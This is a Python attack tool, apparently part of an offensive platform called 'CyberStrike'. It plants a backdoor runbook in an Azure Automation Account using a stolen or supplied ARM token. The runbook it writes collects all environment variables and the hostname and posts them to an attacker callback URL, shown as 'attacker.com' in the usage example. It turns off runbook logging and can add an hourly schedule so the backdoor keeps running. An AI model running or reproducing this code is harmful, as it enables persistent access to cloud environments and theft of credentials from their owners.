#!/usr/bin/env python3
"""
runbook_backdoor.py — Azure Automation Account Runbook Backdoor

Creates or injects backdoor code into Azure Automation Account runbooks
for persistent access and credential harvesting.

Part of CyberStrike offensive security platform.
"""

import argparse
import json
import os
import signal
import sys
import time
from datetime import datetime
from pathlib import Path

try:
    import requests
except ImportError:
    print("ERROR: requests required. Install: pip3 install requests", file=sys.stderr)
    sys.exit(1)

ARM_BASE = "https://management.azure.com"
STATE_FILE = str(Path.home() / ".cyberstrike" / "azurehook-state.json")


def load_state():
    try:
        with open(STATE_FILE, "r") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {"created_resources": []}


def save_state(state):
    os.makedirs(os.path.dirname(STATE_FILE), exist_ok=True)
    with open(STATE_FILE, "w") as f:
        json.dump(state, f, indent=2, default=str)


class RunbookBackdoor:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True
        self.token = args.token or os.environ.get("AZURE_ACCESS_TOKEN", "")
        self.state = load_state()

    def signal_handler(self, signum, frame):
        self.running = False

    def print_banner(self):
        print("=" * 70)
        print("CyberStrike — Azure Runbook Backdoor")
        print("=" * 70)
        print(f"PID:             {os.getpid()}")
        print(f"Automation:      {self.args.automation_account}")
        print(f"Resource Group:  {self.args.resource_group}")
        print(f"Subscription:    {self.args.subscription_id or 'auto'}")
        print(f"Callback:        {self.args.callback_url or 'N/A'}")
        print(f"Output:          {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:         {datetime.now().isoformat()}")
        print("=" * 70)
        print()

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record, default=str), flush=True)
        else:
            action = record.get("action", "info")
            status = record.get("status", "")
            detail = record.get("detail", "")
            print(f"[{action.upper():<16}] [{status.upper():<8}] {detail}", flush=True)

    def headers(self):
        return {"Authorization": f"Bearer {self.token}", "Content-Type": "application/json"}

    def track_resource(self, resource_type, resource_id, **extra):
        entry = {"type": resource_type, "id": resource_id, "created_at": datetime.now().isoformat()}
        entry.update(extra)
        self.state["created_resources"].append(entry)
        save_state(self.state)

    def get_subscription_id(self):
        if self.args.subscription_id:
            return self.args.subscription_id
        r = requests.get(f"{ARM_BASE}/subscriptions?api-version=2022-12-01", headers=self.headers(), timeout=30)
        if r.status_code == 200:
            subs = r.json().get("value", [])
            if subs:
                return subs[0]["subscriptionId"]
        return None

    def create_runbook(self):
        sub_id = self.get_subscription_id()
        if not sub_id:
            self.emit({"action": "create", "status": "failed", "detail": "Cannot determine subscription ID"})
            return

        account = self.args.automation_account
        rg = self.args.resource_group
        runbook_name = f"cs-runbook-{int(time.time())}"
        callback_url = self.args.callback_url

        runbook_content = f"""
import urllib.request
import json
import os
import subprocess

def main():
    # Gather environment info
    env_data = dict(os.environ)
    hostname = subprocess.check_output(['hostname']).decode().strip()

    payload = json.dumps({{
        "source": "azure_runbook",
        "hostname": hostname,
        "automation_account": "{account}",
        "environment": env_data,
    }}).encode()

    try:
        req = urllib.request.Request("{callback_url}", data=payload,
                                     headers={{"Content-Type": "application/json"}})
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass

main()
"""

        base_url = f"{ARM_BASE}/subscriptions/{sub_id}/resourceGroups/{rg}/providers/Microsoft.Automation/automationAccounts/{account}"

        body = {
            "properties": {
                "runbookType": "Python3",
                "description": "CyberStrike runbook",
                "logProgress": False,
                "logVerbose": False,
            },
            "location": self.args.location or "eastus",
        }

        url = f"{base_url}/runbooks/{runbook_name}?api-version=2023-11-01"
        r = requests.put(url, headers=self.headers(), json=body, timeout=30)
        if r.status_code not in (200, 201):
            self.emit({"action": "create", "status": "failed", "detail": f"Create runbook: HTTP {r.status_code}: {r.text[:300]}"})
            return

        self.track_resource("runbook", runbook_name, subscription_id=sub_id, resource_group=rg, automation_account=account)
        self.emit({"action": "create", "status": "success", "detail": f"Created runbook {runbook_name}"})

        draft_url = f"{base_url}/runbooks/{runbook_name}/draft/content?api-version=2023-11-01"
        r2 = requests.put(draft_url, headers={"Authorization": f"Bearer {self.token}", "Content-Type": "text/powershell"}, data=runbook_content, timeout=30)
        if r2.status_code in (200, 202):
            self.emit({"action": "upload", "status": "success", "detail": f"Uploaded content to {runbook_name}"})
        else:
            self.emit({"action": "upload", "status": "failed", "detail": f"HTTP {r2.status_code}"})
            return

        publish_url = f"{base_url}/runbooks/{runbook_name}/publish?api-version=2023-11-01"
        r3 = requests.post(publish_url, headers=self.headers(), timeout=30)
        if r3.status_code in (200, 202):
            self.emit({"action": "publish", "status": "success", "detail": f"Published {runbook_name}"})
        else:
            self.emit({"action": "publish", "status": "failed", "detail": f"HTTP {r3.status_code}"})

        if self.args.schedule:
            sched_name = f"cs-schedule-{int(time.time())}"
            sched_body = {
                "properties": {
                    "startTime": datetime.utcnow().isoformat() + "Z",
                    "frequency": "Hour",
                    "interval": 1,
                    "description": "CyberStrike schedule",
                }
            }
            sched_url = f"{base_url}/schedules/{sched_name}?api-version=2023-11-01"
            r4 = requests.put(sched_url, headers=self.headers(), json=sched_body, timeout=30)
            if r4.status_code in (200, 201):
                self.track_resource("schedule", sched_name, automation_account=account)
                self.emit({"action": "schedule", "status": "success", "detail": f"Created schedule {sched_name}"})

                link_body = {"properties": {"schedule": {"name": sched_name}, "runbook": {"name": runbook_name}}}
                link_url = f"{base_url}/jobSchedules/{sched_name}?api-version=2023-11-01"
                requests.put(link_url, headers=self.headers(), json=link_body, timeout=30)
            else:
                self.emit({"action": "schedule", "status": "failed", "detail": f"HTTP {r4.status_code}"})

    def run(self):
        self.print_banner()

        if not self.token:
            print("ERROR: Access token required. Set --token or AZURE_ACCESS_TOKEN.", file=sys.stderr)
            sys.exit(1)

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        self.create_runbook()
        self.cleanup()

    def cleanup(self):
        print(f"\n--- runbook_backdoor summary ---")
        print(f"Records: {self.event_count}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Create backdoor runbook in Azure Automation Account.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 runbook_backdoor.py --automation-account myAuto --resource-group myRG --callback-url https://attacker.com/cb\n"
        ),
    )
    parser.add_argument("--automation-account", type=str, required=True, help="Automation Account name")
    parser.add_argument("--resource-group", type=str, required=True, help="Resource Group name")
    parser.add_argument("--subscription-id", type=str, default=None, help="Subscription ID")
    parser.add_argument("--callback-url", type=str, required=True, help="Callback URL")
    parser.add_argument("--schedule", action="store_true", default=False, help="Create hourly schedule")
    parser.add_argument("--location", type=str, default="eastus", help="Azure region (default: eastus)")
    parser.add_argument("--token", type=str, default=None, help="Azure ARM access token")
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    backdoor = RunbookBackdoor(args)
    backdoor.run()


if __name__ == "__main__":
    main()
